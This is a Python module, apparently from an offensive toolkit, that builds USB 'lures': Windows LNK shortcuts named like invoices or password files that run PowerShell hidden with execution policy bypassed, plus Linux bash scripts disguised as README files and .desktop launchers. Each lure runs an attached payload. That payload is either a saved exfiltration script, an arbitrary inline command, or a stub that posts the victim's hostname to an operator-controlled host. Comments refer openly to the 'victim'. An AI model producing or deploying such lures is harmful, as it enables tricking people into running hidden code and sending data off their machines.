"""
USB lure builder (Phase 5.2) - deceptive files that run a payload when opened.
Windows: LNK shortcuts · Linux: bash lure + .desktop entry
"""

import base64
import json
import os
import re
from pathlib import Path
from typing import Any, Optional

from config import USERS_DIR

_FILENAME_RE = re.compile(r"[^\w.\-]")

LURE_TYPES = [
    {
        "id": "lnk",
        "label": "LNK shortcut",
        "platform": "windows",
        "desc": "Double-click shortcut runs payload via cmd + PowerShell",
    },
    {
        "id": "bash_lure",
        "label": "Bash lure (README / install script)",
        "platform": "linux",
        "desc": "Shell script disguised as README or install instructions",
    },
    {
        "id": "desktop",
        "label": "Desktop entry (.desktop)",
        "platform": "linux",
        "desc": "GNOME/KDE shortcut that launches the payload",
    },
]

LURE_PRESETS = [
    {"id": "invoice", "label": "Invoice_2026", "windows": "Invoice_2026.lnk", "linux": "README.txt"},
    {"id": "vpn", "label": "VPN_Setup", "windows": "VPN_Setup.lnk", "linux": "install_vpn.sh"},
    {"id": "passwords", "label": "Passwords.txt", "windows": "Passwords.txt.lnk", "linux": "Passwords_README.txt"},
    {"id": "confidential", "label": "Confidential_DO_NOT_OPEN", "windows": "Confidential_DO_NOT_OPEN.lnk", "linux": "CONFIDENTIAL_README.txt"},
    {"id": "custom", "label": "Custom name", "windows": "", "linux": ""},
]

PAYLOAD_SOURCES = [
    {"id": "saved", "label": "Saved USB payload (Snarf or prior save)"},
    {"id": "stub_windows", "label": "Minimal Windows test stub (PowerShell)"},
    {"id": "stub_linux", "label": "Minimal Linux test stub (Bash)"},
    {"id": "inline", "label": "Custom inline command"},
]

COMPANION_PS1 = "_tsk_lure_payload.ps1"
COMPANION_SH = "_tsk_lure_payload.sh"

_LURE_COMPANION_NAMES = frozenset({COMPANION_PS1, COMPANION_SH})


def _user_usb_dir(username: str) -> Path:
    base = (USERS_DIR / username / "payloads" / "usb").resolve()
    base.mkdir(parents=True, exist_ok=True)
    return base


def _safe_name(name: str, default: str = "lure") -> str:
    stem = _FILENAME_RE.sub("_", name.strip())[:64]
    return stem or default


def _package_slug(name: str) -> str:
    return _safe_name(name, "lure_pkg")


def is_lure_companion_name(filename: str) -> bool:
    return (filename or "").strip() in _LURE_COMPANION_NAMES


def is_lure_companion_file(fpath: Path) -> bool:
    """True for bundled lure runner scripts that should not appear as MY PAYLOADS."""
    if not fpath.is_file():
        return False
    name = fpath.name
    if is_lure_companion_name(name) or name.startswith("_tsk_lure"):
        return True
    try:
        head = fpath.read_text(encoding="utf-8", errors="ignore")[:160]
    except OSError:
        return False
    return head.startswith("# TSK lure payload stub") or head.startswith("# TSK inline lure")


def list_saved_scripts(username: str) -> list[dict]:
    """Exfil / operator scripts available for lure attachment (USB root only)."""
    base = _user_usb_dir(username)
    scripts = []
    for fpath in sorted(base.iterdir()):
        if not fpath.is_file() or fpath.name.startswith("."):
            continue
        if is_lure_companion_name(fpath.name):
            continue
        ext = fpath.suffix.lower()
        if ext not in (".ps1", ".sh", ".py", ".bat"):
            continue
        scripts.append({
            "filename": fpath.name,
            "lang": "PS1" if ext == ".ps1" else "SH" if ext == ".sh" else ext.upper().strip("."),
            "size": fpath.stat().st_size,
        })
    return scripts


def get_options(username: str = "default") -> dict:
    return {
        "lure_types": LURE_TYPES,
        "presets": LURE_PRESETS,
        "payload_sources": PAYLOAD_SOURCES,
        "saved_scripts": list_saved_scripts(username),
        "companion_names": {"windows": COMPANION_PS1, "linux": COMPANION_SH},
    }


def _normalize(raw: dict, user_cfg: Optional[dict] = None) -> dict:
    cfg = user_cfg or {}
    lure_type = raw.get("lure_type") or "lnk"
    if lure_type not in {t["id"] for t in LURE_TYPES}:
        raise ValueError(f"Unknown lure type: {lure_type}")

    preset_id = raw.get("preset") or "invoice"
    preset = next((p for p in LURE_PRESETS if p["id"] == preset_id), LURE_PRESETS[0])
    custom = str(raw.get("custom_name") or "").strip()
    package_name = str(raw.get("package_name") or "").strip()

    platform = "windows" if lure_type == "lnk" else "linux"
    if preset_id == "custom":
        if not custom:
            raise ValueError("Enter a custom lure name")
        lure_filename = custom
        if lure_type == "lnk" and not lure_filename.lower().endswith(".lnk"):
            lure_filename += ".lnk"
        if lure_type == "desktop" and not lure_filename.lower().endswith(".desktop"):
            lure_filename += ".desktop"
    else:
        if lure_type == "desktop":
            stem = Path(preset["linux"]).stem if platform == "linux" else Path(preset["windows"]).stem
            lure_filename = f"{stem}.desktop"
        else:
            lure_filename = preset["windows"] if platform == "windows" else preset["linux"]

    payload_source = raw.get("payload_source") or "saved"
    saved_file = str(raw.get("saved_payload") or "").strip()
    inline_cmd = str(raw.get("inline_command") or "").strip()

    return {
        "lure_type": lure_type,
        "platform": platform,
        "lure_filename": lure_filename,
        "preset": preset_id,
        "package_name": package_name,
        "payload_source": payload_source,
        "saved_payload": saved_file,
        "inline_command": inline_cmd,
        "lhost": str(raw.get("lhost") or cfg.get("lhost") or "127.0.0.1").strip(),
        "lport": str(raw.get("lport") or cfg.get("lport") or "1337").strip(),
        "catch_token": str(cfg.get("catch_token") or "").strip(),
        "desktop_title": str(raw.get("desktop_title") or "Important Documents").strip(),
    }


def suggest_package_name(conf: dict) -> str:
    preset = conf.get("preset") or "invoice"
    src = conf.get("payload_source") or "stub"
    lure = conf.get("lure_type") or "lure"
    if conf.get("package_name"):
        return conf["package_name"]
    if preset == "custom" and conf.get("lure_filename"):
        stem = Path(conf["lure_filename"]).stem
        return _safe_name(stem, "custom_lure")
    return _safe_name(f"{lure}_{preset}_{src}", "lure_pkg")


def _stub_ps1(lhost: str, lport: str, catch_token: str = "") -> str:
    ct_param = f"?ct={catch_token}" if catch_token else ""
    return (
        "# TSK lure payload stub\n"
        f"$url = 'http://{lhost}:{lport}/api/snarf{ct_param}'\n"
        "try {\n"
        "  $body = @{ hostname = $env:COMPUTERNAME; source = 'lure_stub';"
        " content = 'tsk2_lure_stub_ok'; filename = 'lure_check.txt' } | ConvertTo-Json\n"
        "  Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json'"
        " -Body $body -TimeoutSec 8\n"
        "} catch { }\n"
    )


def _stub_sh(lhost: str, lport: str, catch_token: str = "") -> str:
    ct_param = f"?ct={catch_token}" if catch_token else ""
    return (
        "#!/bin/bash\n"
        "# TSK lure payload stub\n"
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d \"{{\\\"hostname\\\":\\\"$(hostname)\\\",\\\"source\\\":\\\"lure_stub\\\","
        f"\\\"content\\\":\\\"tsk2_lure_stub_ok\\\",\\\"filename\\\":\\\"lure_check.txt\\\"}}\""
        f" 'http://{lhost}:{lport}/api/snarf{ct_param}' >/dev/null 2>&1 || true\n"
    )


def _resolve_payload(conf: dict, username: str) -> tuple[str, str, str]:
    """Return (payload_filename, content, lang)."""
    platform = conf["platform"]
    src = conf["payload_source"]

    if src == "saved":
        if not conf["saved_payload"]:
            raise ValueError("Select a saved payload script")
        base = _user_usb_dir(username)
        path = (base / conf["saved_payload"]).resolve()
        if not str(path).startswith(str(base)) or not path.is_file():
            raise ValueError("Saved payload not found")
        content = path.read_text(encoding="utf-8", errors="replace")
        ext = path.suffix.lower()
        if ext == ".ps1":
            lang = "PS1"
        elif ext == ".sh":
            lang = "SH"
        else:
            lang = "PY"
        return path.name, content, lang

    if src == "inline":
        if not conf["inline_command"]:
            raise ValueError("Enter a custom inline command")
        if platform == "windows":
            content = (
                f"# TSK inline lure\n"
                f"{conf['inline_command']}\n"
            )
            return COMPANION_PS1, content, "PS1"
        content = (
            "#!/bin/bash\n"
            f"{conf['inline_command']}\n"
        )
        return COMPANION_SH, content, "SH"

    if src == "stub_windows" or (src == "stub_linux" and platform == "windows"):
        return COMPANION_PS1, _stub_ps1(conf["lhost"], conf["lport"], conf.get("catch_token", "")), "PS1"

    return COMPANION_SH, _stub_sh(conf["lhost"], conf["lport"], conf.get("catch_token", "")), "SH"


def _build_lnk_bytes(payload_filename: str) -> bytes:
    try:
        from pylnk3 import for_file
    except ImportError:
        raise RuntimeError("pylnk3 is required - run: uv sync")

    ps_arg = (
        f'-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass '
        f'-File "%~dp0{payload_filename}"'
    )
    cmd_args = f'/c powershell {ps_arg}'
    cmd_exe = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "cmd.exe")
    cmd_exe = cmd_exe.replace("/", "\\")
    if not cmd_exe[1] == ":":
        cmd_exe = "C:\\Windows\\System32\\cmd.exe"

    import tempfile
    with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as tmp:
        tmp_path = tmp.name

    try:
        lnk = for_file(
            cmd_exe,
            arguments=cmd_args,
            work_dir="%~dp0",
            description="Document",
        )
        with open(tmp_path, "wb") as fh:
            lnk.save(fh)
        return Path(tmp_path).read_bytes()
    finally:
        Path(tmp_path).unlink(missing_ok=True)


def _build_bash_lure(lure_filename: str, payload_filename: str) -> str:
    return (
        f"#!/bin/bash\n"
        f"# README - open with: bash {lure_filename}\n"
        f"cd \"$(dirname \"$0\")\"\n"
        f"bash \"./{payload_filename}\"\n"
    )


def _build_desktop_lure(conf: dict, lure_filename: str, payload_filename: str) -> str:
    title = conf["desktop_title"] or "Important Documents"
    return (
        "[Desktop Entry]\n"
        "Type=Application\n"
        f"Name={title}\n"
        f"Exec=bash -c \"cd \\\"$(dirname \\\"%k\\\")\\\" && bash ./{payload_filename}\"\n"
        "Icon=folder\n"
        "Terminal=false\n"
    )


def build_lure(raw: dict, user_cfg: Optional[dict] = None, username: str = "default") -> dict:
    conf = _normalize(raw, user_cfg)
    payload_filename, payload_content, lang = _resolve_payload(conf, username)

    artifacts: list[dict] = []
    warnings: list[str] = []

    if conf["payload_source"] != "saved" or payload_filename.startswith("_tsk"):
        artifacts.append({
            "filename": payload_filename,
            "content": payload_content,
            "binary": False,
            "lang": lang,
        })

    lure_file = conf["lure_filename"]
    if conf["lure_type"] == "lnk":
        lnk_bytes = _build_lnk_bytes(payload_filename)
        artifacts.insert(0, {
            "filename": lure_file,
            "content_base64": base64.b64encode(lnk_bytes).decode("ascii"),
            "binary": True,
            "lang": "LNK",
        })
        warnings.append(
            "Flash the LNK and payload script together to the same folder on the USB stick."
        )
    elif conf["lure_type"] == "bash_lure":
        lure_content = _build_bash_lure(lure_file, payload_filename)
        artifacts.insert(0, {
            "filename": lure_file,
            "content": lure_content,
            "binary": False,
            "lang": "SH",
        })
        warnings.append("On Linux, victim may need to run: bash README.txt")
    else:
        desktop_content = _build_desktop_lure(conf, lure_file, payload_filename)
        artifacts.insert(0, {
            "filename": lure_file,
            "content": desktop_content,
            "binary": False,
            "lang": "DESKTOP",
        })
        warnings.append("Some desktops require marking the .desktop file as trusted.")

    if conf["payload_source"] == "saved":
        warnings.append(f"Flash lure together with saved script: {payload_filename}")

    package_files = [a["filename"] for a in artifacts]
    if conf["payload_source"] == "saved" and payload_filename not in package_files:
        package_files.append(payload_filename)

    suggested_name = suggest_package_name(conf)
    if not conf.get("package_name"):
        warnings.append(f"Set a package name before save (suggested: {suggested_name}).")

    return {
        "lure_type": conf["lure_type"],
        "platform": conf["platform"],
        "lure_file": lure_file,
        "suggested_package_name": suggested_name,
        "artifacts": artifacts,
        "package_files": package_files,
        "package_meta": {
            "lure_type": conf["lure_type"],
            "preset": conf.get("preset"),
            "payload_source": conf["payload_source"],
            "saved_payload": conf.get("saved_payload") or "",
        },
        "warnings": warnings,
    }


def _safe_artifact_basename(filename: str) -> str:
    safe = _FILENAME_RE.sub("_", (filename or "").strip())
    if not safe or safe.startswith("."):
        raise ValueError(f"Invalid filename: {filename}")
    return safe


def _safe_pkg_path(pkg_dir: Path, filename: str) -> Path:
    dest = (pkg_dir / _safe_artifact_basename(filename)).resolve()
    if not str(dest).startswith(str(pkg_dir.resolve())):
        raise ValueError("Path outside package directory")
    return dest


_MANIFEST_FILE = ".lure_packages.json"


def _read_manifest(base: Path) -> dict:
    path = base / _MANIFEST_FILE
    if not path.is_file():
        return {"version": 2, "packages": {}}
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return {"version": 2, "packages": {}}

    if isinstance(raw.get("packages"), dict):
        raw.setdefault("version", 2)
        return raw

    packages: dict[str, Any] = {}
    for key, files in raw.items():
        if key in ("version", "packages") or not isinstance(files, list) or not files:
            continue
        lure = files[0]
        slug = _package_slug(Path(str(lure)).stem)
        n = 1
        base_slug = slug
        while slug in packages:
            slug = f"{base_slug}_{n}"
            n += 1
        packages[slug] = {
            "display_name": Path(str(lure)).stem.replace("_", " ").title(),
            "lure_file": lure,
            "files": files,
            "storage": "flat",
        }
    return {"version": 2, "packages": packages}


def _write_manifest(base: Path, manifest: dict) -> None:
    path = base / _MANIFEST_FILE
    manifest.setdefault("version", 2)
    path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")


def _write_artifact(dest: Path, art: dict) -> None:
    filename = dest.name
    if art.get("binary") and art.get("content_base64"):
        dest.write_bytes(base64.b64decode(art["content_base64"]))
    elif art.get("content") is not None:
        dest.write_text(str(art["content"]), encoding="utf-8")
        if filename.endswith(".sh") or (
            filename.endswith(".txt") and "bash" in str(art.get("content", ""))
        ):
            try:
                dest.chmod(dest.stat().st_mode | 0o111)
            except OSError:
                pass
    else:
        raise ValueError(f"No content for {filename}")


def save_lure(
    username: str,
    artifacts: list[dict],
    package_files: list[str] | None = None,
    package_name: str = "",
    package_meta: dict | None = None,
) -> tuple[list[Path], str]:
    display = (package_name or "").strip()
    if not display:
        raise ValueError("Package name is required")
    slug = _package_slug(display)
    if not slug:
        raise ValueError("Invalid package name")

    base = _user_usb_dir(username)
    manifest = _read_manifest(base)
    packages = manifest.setdefault("packages", {})

    # Unique slug if name collides with different package
    if slug in packages and packages[slug].get("display_name") != display:
        n = 2
        while f"{slug}_{n}" in packages:
            n += 1
        slug = f"{slug}_{n}"

    pkg_dir = (base / "packages" / slug).resolve()
    if not str(pkg_dir).startswith(str(base)):
        raise ValueError("Invalid package path")
    pkg_dir.mkdir(parents=True, exist_ok=True)

    written: list[Path] = []
    files_list = package_files or [a.get("filename") for a in artifacts if a.get("filename")]
    lure_file = next(
        (a.get("filename") for a in artifacts if a.get("lang") in ("LNK", "DESKTOP", "SH") and not a.get("filename", "").startswith("_tsk")),
        files_list[0] if files_list else "",
    )

    for art in artifacts:
        filename = art.get("filename") or ""
        dest = _safe_pkg_path(pkg_dir, filename)
        _write_artifact(dest, art)
        written.append(dest)

    packages[slug] = {
        "display_name": display,
        "lure_file": lure_file,
        "files": files_list,
        "meta": package_meta or {},
    }
    _write_manifest(base, manifest)
    return written, slug


def _package_relative_paths(slug: str, files: list[str]) -> list[str]:
    return [f"packages/{slug}/{f}" for f in files]


def resolve_lure_package(username: str, key: str) -> Optional[dict]:
    """Find package by slug, lure filename, or display name."""
    key = (key or "").strip()
    if not key:
        return None
    base = _user_usb_dir(username)
    manifest = _read_manifest(base)
    packages = manifest.get("packages", {})

    if key in packages:
        return {"slug": key, **packages[key]}

    for slug, pkg in packages.items():
        if pkg.get("lure_file") == key or pkg.get("display_name") == key:
            return {"slug": slug, **pkg}

    return None


def get_lure_package_files(username: str, lure_key: str) -> list[str]:
    """Return relative paths under USB payload dir for package files."""
    base = _user_usb_dir(username)
    pkg = resolve_lure_package(username, lure_key)
    if pkg:
        slug = pkg["slug"]
        rels = []
        pkg_dir = base / "packages" / slug
        for fn in pkg.get("files") or []:
            rel = f"packages/{slug}/{fn}"
            if (base / rel).is_file():
                rels.append(rel)
            elif (pkg_dir / fn).is_file():
                rels.append(rel)
        return rels

    # Legacy flat file on USB root
    if (base / lure_key).is_file():
        names = list_lure_package_files(username, lure_key)
        return [n for n in names if (base / n).is_file()]
    return []


def _resolve_lure_file_in_package(pkg_dir: Path, pkg: dict) -> tuple[str, Optional[Path]]:
    """Return lure filename and path; pick first non-companion file if manifest is stale."""
    lure = (pkg.get("lure_file") or "").strip()
    if lure:
        candidate = pkg_dir / lure
        if candidate.is_file():
            return lure, candidate
    if not pkg_dir.is_dir():
        return lure, None
    for fpath in sorted(pkg_dir.iterdir()):
        if not fpath.is_file() or is_lure_companion_file(fpath):
            continue
        return fpath.name, fpath
    return lure, None


def index_user_lures(username: str) -> list[dict]:
    """Index saved lure packages for the payload browser."""
    base = _user_usb_dir(username)
    if not base.exists():
        return []

    payloads: list[dict] = []
    manifest = _read_manifest(base)
    manifest_dirty = False

    for slug in sorted(manifest.get("packages", {}).keys(), reverse=True):
        pkg = manifest["packages"][slug]
        pkg_dir = base / "packages" / slug
        lure, lure_path = _resolve_lure_file_in_package(pkg_dir, pkg)
        if lure and lure != pkg.get("lure_file"):
            pkg["lure_file"] = lure
            manifest_dirty = True
        if not lure_path or not lure_path.is_file():
            continue
        ext = lure_path.suffix.lower()
        lang = "LNK" if ext == ".lnk" else "DESKTOP" if ext == ".desktop" else "SH"
        meta = pkg.get("meta") or {}
        bits = [meta["lure_type"], meta.get("payload_source")]
        bits = [b for b in bits if b]
        desc = "USB lure package"
        if bits:
            desc += f" · {' / '.join(bits)}"
        payloads.append({
            "name": pkg.get("display_name") or slug.replace("_", " ").title(),
            "file": lure,
            "package_id": slug,
            "path": str(lure_path.resolve()),
            "cat": "LURES",
            "tags": ["LURE", "EXEC"],
            "lang": lang,
            "desc": desc,
            "operator_owned": True,
        })

    if manifest_dirty:
        _write_manifest(base, manifest)

    indexed_lures = {p["file"] for p in payloads}

    # Legacy flat saves on USB root only when no package manifest exists yet
    if not manifest.get("packages"):
        lure_exts = {".lnk", ".desktop"}
        lure_names = {".txt", ".sh"}
        for fpath in sorted(base.iterdir()):
            if not fpath.is_file() or fpath.name.startswith("."):
                continue
            if fpath.name in indexed_lures:
                continue
            ext = fpath.suffix.lower()
            name_low = fpath.name.lower()
            is_lure = ext in lure_exts or (
                ext in lure_names and any(
                    k in name_low for k in ("readme", "install", "password", "confidential", "vpn")
                )
            )
            if not is_lure:
                continue
            lang = "LNK" if ext == ".lnk" else "DESKTOP" if ext == ".desktop" else "SH"
            payloads.append({
                "name": fpath.stem.replace("_", " ").title(),
                "file": fpath.name,
                "package_id": "",
                "path": str(fpath.resolve()),
                "cat": "LURES",
                "tags": ["LURE", "EXEC"],
                "lang": lang,
                "desc": "USB lure (legacy flat save)",
                "operator_owned": True,
            })
    return payloads


def list_lure_package_files(username: str, lure_filename: str) -> list[str]:
    """Basenames to copy when flashing (legacy root layout)."""
    rels = get_lure_package_files(username, lure_filename)
    if rels:
        return rels
    base = _user_usb_dir(username)
    lure_path = base / lure_filename
    if not lure_path.is_file():
        return []

    names = [lure_filename]
    for fpath in base.iterdir():
        if not fpath.is_file():
            continue
        if fpath.name == lure_filename:
            continue
        if is_lure_companion_name(fpath.name):
            names.append(fpath.name)
        elif fpath.suffix.lower() in (".ps1", ".sh", ".py", ".bat"):
            names.append(fpath.name)
    return names


def iter_lure_skip_basenames(username: str) -> set[str]:
    """Root-level USB filenames that belong to lure packages (hide from MY PAYLOADS)."""
    skip = set(_LURE_COMPANION_NAMES)
    base = _user_usb_dir(username)
    for fpath in base.iterdir():
        if fpath.is_file() and is_lure_companion_file(fpath):
            skip.add(fpath.name)
    manifest = _read_manifest(base)
    for pkg in manifest.get("packages", {}).values():
        for fn in pkg.get("files") or []:
            skip.add(fn)
    return skip


def rename_lure_package(username: str, package_id: str, display_name: str) -> dict:
    display = (display_name or "").strip()
    if not display:
        raise ValueError("Package name required")
    base = _user_usb_dir(username)
    manifest = _read_manifest(base)
    packages = manifest.get("packages", {})
    slug = (package_id or "").strip()
    if slug not in packages:
        raise ValueError("Lure package not found")
    packages[slug]["display_name"] = display
    _write_manifest(base, manifest)
    pkg = packages[slug]
    pkg_dir = base / "packages" / slug
    lure, lure_path = _resolve_lure_file_in_package(pkg_dir, pkg)
    if lure and lure != pkg.get("lure_file"):
        pkg["lure_file"] = lure
        _write_manifest(base, manifest)
    ext = lure_path.suffix.lower() if lure_path and lure_path.suffix else ""
    lang = "LNK" if ext == ".lnk" else "DESKTOP" if ext == ".desktop" else "SH"
    meta = pkg.get("meta") or {}
    bits = [meta.get("lure_type"), meta.get("payload_source")]
    bits = [b for b in bits if b]
    desc = "USB lure package"
    if bits:
        desc += f" · {' / '.join(bits)}"
    return {
        "name": display,
        "file": lure,
        "package_id": slug,
        "path": str(lure_path.resolve()) if lure_path and lure_path.is_file() else "",
        "cat": "LURES",
        "tags": ["LURE", "EXEC"],
        "lang": lang,
        "desc": desc,
        "operator_owned": True,
    }


def delete_lure_package(username: str, package_id: str) -> int:
    base = _user_usb_dir(username)
    manifest = _read_manifest(base)
    packages = manifest.get("packages", {})
    slug = (package_id or "").strip()
    if slug not in packages:
        raise ValueError("Lure package not found")
    pkg_dir = base / "packages" / slug
    removed = 0
    if pkg_dir.is_dir():
        for fpath in pkg_dir.iterdir():
            if fpath.is_file():
                fpath.unlink(missing_ok=True)
                removed += 1
        try:
            pkg_dir.rmdir()
        except OSError:
            pass
    del packages[slug]
    _write_manifest(base, manifest)
    return removed
